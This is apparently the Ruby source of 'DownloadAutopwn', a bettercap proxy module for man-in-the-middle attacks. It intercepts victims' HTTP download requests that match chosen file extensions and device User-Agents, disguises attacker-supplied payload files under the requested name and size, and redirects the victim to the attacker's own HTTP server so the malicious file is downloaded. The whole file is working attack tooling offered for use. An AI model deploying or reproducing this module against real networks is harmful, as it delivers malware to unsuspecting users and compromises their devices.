=begin
BETTERCAP
Author : Simone 'evilsocket' Margaritelli
Email  : evilsocket@gmail.com
Blog   : https://www.evilsocket.net/
Usage  : bettercap --proxy-module bettercap-proxy-modules/http/download_autopwn.rb --download-autopwn-extensions EXT1,EXT2 --download-autopwn-useragents android,ios,linux,macos,windows,ps4 --download-autopwn-path bettercap-proxy-modules/http/download_autopwn/
This project is released under the GPL 3 license.
=end

require 'uri'

class DownloadAutopwn < BetterCap::Proxy::HTTP::Module

  meta(
    'Name'        => 'DownloadAutopwn',
    'Description' => "Renames & resizes local payloads and redirects victim's download requests if they match the specified file extensions and User-Agents.",
    'Version'     => '2.0.0',
    'Author'      => "@yungtravla",
    'License'     => 'GPL3'
  )

  @@userAgents = nil
  @@thisUserAgentList = nil
  @@autopwnUserAgents = nil
  @@autopwnExtensions = nil
  @@autopwnPath = nil
  @@autopwnPort = nil
  @@autopwnFiles = nil
  @@autopwnFile = nil
  @@autopwnFileSize = nil
  @@autopwnedFile = nil
  @@parsedURI = nil
  BetterCap::Context.get.options.servers.httpd = true

  def self.on_options(opts)
    opts.on( '--httpd', "Enable HTTP server, default to #{'false'}." ) do
      raise BetterCap::Error, "The httpd-server is already in use by DownloadAutopwn proxy module."
    end
    opts.on( '--httpd-port PORT', "Set HTTP server port, default to #{@httpd_port.to_s}." ) do
      raise BetterCap::Error, "The httpd-server is already in use by DownloadAutopwn proxy module."
    end
    opts.on( '--httpd-path PATH', "Set HTTP server path, default to #{@httpd_path} ." ) do
      raise BetterCap::Error, "The httpd-server is already in use by DownloadAutopwn proxy module."
    end
    opts.on( '--download-autopwn-extensions EXT1,EXT2', "Comma separated list of file extensions to autopwn." ) do |v|
      @@autopwnExtensions = v.downcase.split(",").map(&:strip).reject(&:empty?)
    end
    opts.on( '--download-autopwn-useragents AGENT1,AGENT2', "Comma separated list of User-Agents to autopwn, either add your own folder or choose from the following: " + "android".yellow + ", " + "ios".yellow + ", " + "linux".yellow + ", " + "macos".yellow + ", " + "ps4".yellow + ", " + "windows".yellow + "." ) do |v|
      @@autopwnUserAgents = v.downcase.split(",").map(&:strip).reject(&:empty?)
    end
    opts.on( '--download-autopwn-path PATH', "Path to folder containing malicious files to be used by httpd-server." ) do |v|
      @@autopwnPath = v
    end
    opts.on( '--download-autopwn-port PORT', "Port to be used by httpd-server, default to " + "8042".yellow ) do |v|
      @@autopwnPort = v
    end
  end

  def initialize
    # Check options
    raise BetterCap::Error, "No --download-autopwn-extensions option specified for the proxy module." if @@autopwnExtensions.nil?
    raise BetterCap::Error, "No --download-autopwn-path option specified for the proxy module." if @@autopwnPath.nil?
    raise BetterCap::Error, "No --download-autopwn-useragents option specified for the proxy module.\n    Either add your own folder or choose from the following: android, ios, linux, macos, ps4, windows." if @@autopwnUserAgents.nil?


    # Check path and User-Agent folders
    @@autopwnPath += "/" if @@autopwnPath[-1] != "/"
    raise BetterCap::Error, "#{@@autopwnPath} does not exist." unless Dir.exists?("#{@@autopwnPath}")
    @@userAgents = Dir.entries("#{@@autopwnPath}") - [".", ".."]
    raise BetterCap::Error, "#{@@autopwnPath} is empty." unless @@userAgents[0]

    # Check User-Agents
    for @@thisUserAgent in @@autopwnUserAgents
      raise BetterCap::Error, "Could not find User-Agent #{@@thisUserAgent.yellow} in #{@@autopwnPath} (the specified User-Agent must match the folder name)." if !@@userAgents.include?(@@thisUserAgent)
      for @@thisExtension in @@autopwnExtensions
        @@autopwnFiles = Dir.glob("#{@@autopwnPath}#{@@thisUserAgent}/*.#{@@thisExtension}")
        raise BetterCap::Error, "#{@@autopwnPath}#{@@thisUserAgent} is missing a " + "#{@@thisExtension.upcase}" + " file." if @@autopwnFiles[0].nil?
        raise BetterCap::Error, "#{@@autopwnPath}#{@@thisUserAgent} contains more than one " + "#{@@thisExtension.upcase}" + " file." if @@autopwnFiles[1]
      end
    end

    # Initiate
    BetterCap::Logger.info "[" + "DOWNLOADAUTOPWN".green + "] Autopwning downloads with the following extension#{'s' if @@autopwnExtensions[1]}: " + "#{@@autopwnExtensions.join(',')}".upcase + "."
    BetterCap::Logger.info "[" + "DOWNLOADAUTOPWN".green + "] Autopwning downloads requests from the following User-Agent#{'s' if @@autopwnUserAgents[1]}: " + "#{@@autopwnUserAgents.join(',')}".upcase.yellow + "."
    BetterCap::Logger.info "[" + "DOWNLOADAUTOPWN".green + "] No --download-autopwn-port option specified. Using default port " + "8042".yellow + "." if @@autopwnPort.nil?
    @@autopwnPort = 8042 if @@autopwnPort.nil?
    # Start httpd server
    @downloadAutopwnServer = BetterCap::Network::Servers::HTTPD.new( @@autopwnPort, @@autopwnPath )
    @downloadAutopwnServer.start 
    BetterCap::Context.get.options.servers.httpd = false
  end

  def on_request(request, response)
    # Parse URL
    @@autopwnedFile = request.path.gsub(/.*\//,"").gsub(/\?.*/,"") # Remove everything before and including "/", remove "?" and everything after
    # Check if request has a file extension
    if @@autopwnedFile.include?(".")
      # For every specified User-Agent
      for @@thisUserAgent in @@autopwnUserAgents
        # Get User-Agent strings from list (bettercap-proxy-modules/http/download_autopwn/.../user-agents.bettercap)
        @@thisUserAgentList = File.read("#{@@autopwnPath}#{@@thisUserAgent}/user-agents.bettercap").split
        # For every User-Agent string in our list (bettercap-proxy-modules/http/download_autopwn/.../user-agents.bettercap)
        for @@thisUserAgentListing in @@thisUserAgentList
          # Check if User-Agent is a match
          if request["User-Agent"].include?(@@thisUserAgentListing)
            for @@thisExtension in @@autopwnExtensions
              if @@autopwnedFile.end_with?(".#{@@thisExtension}")
                # Begin pwnage
                BetterCap::Logger.raw ""
                BetterCap::Logger.raw "  #{' '.swap}  Autopwning download...\n"
                BetterCap::Logger.raw "  #{' '.swap}"
                BetterCap::Logger.raw "  #{' '.swap}  Found " + "#{@@thisExtension}".upcase.yellow + " extension in url " + "http://#{request.host}#{request.path}".yellow
                BetterCap::Logger.raw "  #{' '.swap}"
                BetterCap::Logger.raw "  #{' '.swap}  Grabbing " + "#{@@thisUserAgent.upcase}".yellow + " payload..."
                BetterCap::Logger.raw "  #{' '.swap}  The size of the requested file is " + ( if response.headers["Content-Length"] then "#{response.headers['Content-Length']} bytes".yellow else "undefined".yellow end )

                # Select local payload with matching file extension
                @@autopwnFiles = Dir.glob("#{@@autopwnPath}#{@@thisUserAgent}/*.#{@@thisExtension}")
                @@autopwnFile = @@autopwnFiles[0]
                # Re-check for duplicate payloads in case this ever happens to someone whilst running the proxy module
                raise BetterCap::Error, "#{@@autopwnPath}#{@@thisUserAgent} contains more than one " + "#{@@thisExtension.upcase}" + " file." if @@autopwnFiles[1]

                # Check raw payload size (module will run faster if all these values are preloaded)
                @@autopwnFileSize = File.read("#{@@autopwnFile}").gsub("\u0000","").bytesize # Get raw payload size by escaping nullbytes
                BetterCap::Logger.raw "  #{' '.swap}  The raw size of your payload is " + "#{@@autopwnFileSize} bytes".yellow

                # Truncate payload if its raw size is smaller than the requested download size
                BetterCap::Logger.raw "  #{' '.swap}"
                BetterCap::Logger.raw "  #{' '.swap}  Resizing " + "#{@@thisExtension}".upcase.yellow + " payload to " + "#{response.headers['Content-Length']} bytes".yellow if @@autopwnFileSize < response.headers["Content-Length"].to_i
                File.truncate("#{@@autopwnFile}", response.headers["Content-Length"].to_i) if @@autopwnFileSize < response.headers["Content-Length"].to_i

                # Reset payload size if its raw size is larger than or equal to the requested download size
                BetterCap::Logger.raw "  #{' '.swap}  Resetting " + "#{@@thisExtension}".upcase.yellow + " payload size to " + "#{@@autopwnFileSize} bytes".yellow if @@autopwnFileSize >= response.headers["Content-Length"].to_i
                File.truncate("#{@@autopwnFile}", @@autopwnFileSize) if @@autopwnFileSize >= response.headers["Content-Length"].to_i

                # Rename payload (make sure to unescape filename from URL)
                BetterCap::Logger.raw "  #{' '.swap}  Renaming " + "#{@@thisExtension}".upcase.yellow + " payload to " + "#{URI.unescape(@@autopwnedFile)}".yellow
                File.rename("#{@@autopwnFile}", "#{@@autopwnPath}#{@@thisUserAgent}/#{URI.unescape(@@autopwnedFile)}")

                # Redirect download
                BetterCap::Logger.raw "  #{' '.swap}  Redirecting download request to payload at " + "http://#{BetterCap::Context.get.iface.ip}:#{@@autopwnPort}/#{@@thisUserAgent}/#{@@autopwnedFile}\n".yellow
                response.headers["Status"] = "302"
                # Set new Content-Length to payload size if payload size is larger than or equal to the requested download size
                response.headers["Content-Length"] = "#{@@autopwnFileSize}" if @@autopwnFileSize >= response.headers["Content-Length"].to_i
                # Force download instead of preview
                response.headers["Content-Disposition"] = "attachment; filename=#{@@autopwnedFile}"
                # Set new location
                response.headers["Location"] = "http://#{BetterCap::Context.get.iface.ip}:#{@@autopwnPort}/#{@@thisUserAgent}/#{@@autopwnedFile}"
                # Replace file
                response.body = File.read("#{@@autopwnPath}#{@@thisUserAgent}/#{URI.unescape(@@autopwnedFile)}")

                # Done
                return false
              end
            end
          end
        end
      end
    end
  end
end
